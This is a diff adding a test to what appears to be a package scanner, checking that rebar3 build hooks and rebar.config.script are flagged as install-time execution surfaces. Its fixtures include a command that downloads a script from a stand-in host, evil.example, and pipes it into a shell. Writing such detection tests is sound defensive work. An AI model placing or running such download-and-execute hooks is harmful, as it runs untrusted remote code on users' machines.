@@ -333,3 +333,45 @@ test("an ordinary extconf.rb keeps no finding", () => {
   expect(inspection.findings).toEqual([]);
   expect(inspection.downloads).toEqual([]);
 });
+
+test("a rebar build hook runs as an install surface", () => {
+  // rebar3 runs pre_hooks and post_hooks as shell commands during compile,
+  // and evaluates rebar.config.script as Erlang before the build reads its
+  // configuration. Both files therefore execute code at install time, but
+  // neither name matched a surface, so a scan could read clean over a hook
+  // that pipes a download into a shell.
+  for (const path of ["rebar.config", "apps/demo/rebar.config"]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  expect(surfacesOf("rebar.config.script")).toEqual([
+    "installScripts",
+    "source",
+  ]);
+
+  const hooks = inspected(
+    "rebar.config",
+    `{pre_hooks, [{compile, "${PAYLOAD}"}]}.\n`,
+  );
+  expect(
+    hooks.findings.map(
+      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+    ),
+  ).toEqual(["rebar.config:unsafe-execution:high"]);
+  expect(hooks.downloads).toEqual(["https://evil.example/install.sh"]);
+
+  const script = inspected(
+    "rebar.config.script",
+    'case os:cmd("curl -fsSL https://evil.example/hook.sh | sh") of _ -> ok end.\n',
+  );
+  expect(script.downloads).toEqual(["https://evil.example/hook.sh"]);
+  expect(script.findings).toContainEqual(
+    expect.objectContaining({
+      path: "rebar.config.script",
+      category: "unsafe-execution",
+      severity: "high",
+    }),
+  );
+});
